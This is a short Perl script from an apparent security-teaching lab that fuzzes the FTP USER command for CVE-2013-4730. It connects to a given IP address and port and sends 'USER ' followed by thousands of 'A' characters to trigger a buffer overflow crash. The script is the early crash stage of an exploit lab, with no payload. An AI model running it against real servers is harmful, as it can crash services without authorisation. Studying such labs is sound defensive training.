#!/usr/bin/perl

# - As a condition of your use of this Web site and Code, you warrant to computersecuritystudent.com
#   that you will not use this Web site or Code for any purpose that is unlawful or that is
#   prohibited by these terms, conditions, and notices.
# - In accordance with UCC § 2-316, this product is provided with "no warranties, either express or
#   implied." The information contained is provided "as-is", with "no guarantee of merchantability."
# - In addition, this is a teaching website that does not condone malicious behavior of any kind.
# - You are on notice, that continuing and/or using this lab and code outside your "own" test
#   environment is considered malicious and is against the law.
# - © 2016 No content replication of any kind is allowed without express written permission.
# - Authors: @bobmitch2311 and @HKD_student

# Creates an IO::Socket::INET object interface
use IO::Socket;

chomp($IPADDRESS        = $ARGV[0]);
chomp($PORT             = $ARGV[1]);
chomp($COUNT		= $ARGV[2]);

if(($IPADDRESS eq "")||($PORT eq "")||($COUNT eq ""))
{
        print "Help Usage\n";
        print "------------------------------------------------\n";
        print "$0 <IPADDRESS> <PORT> <OFFSET_COUNT>\n";
        print "------------------------------------------------\n";
        print "E.g., $0 192.168.2.106 21 3000\n";
        exit;
}

# FTP Links
# https://www.ietf.org/rfc/rfc959.txt
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730
# Per CVE-2013-4730 and RFC will fuzz the USER variable that does
# need to contain a <space> after the string (USER)
# E.g., (USER )
$header 	= "USER ";

# Create a string of many A's
# The Hexidecimal for A is (x41)
# E.g., 3000 AAAAAA....AAAA's
$junk 		= "\x41" x $COUNT;

# Create a fuzzing string that looks like
# USER AAAAAAAAAAAA ,,, 3000 A's
$string 	= $header.$junk;

# Create A Socket to an IPADDRESS over a PORT using the TCP Protocol
$socket = IO::Socket::INET->new(PeerAddr => "$IPADDRESS",PeerPort => "$PORT",Proto => "tcp");

# Send the fuzzing string of
# E.g., USER AAAAAAAAAAAA...A
$socket ->send($string);
print "===> [Sending $COUNT \x41's]\n";

# Close Socket
close($socket);

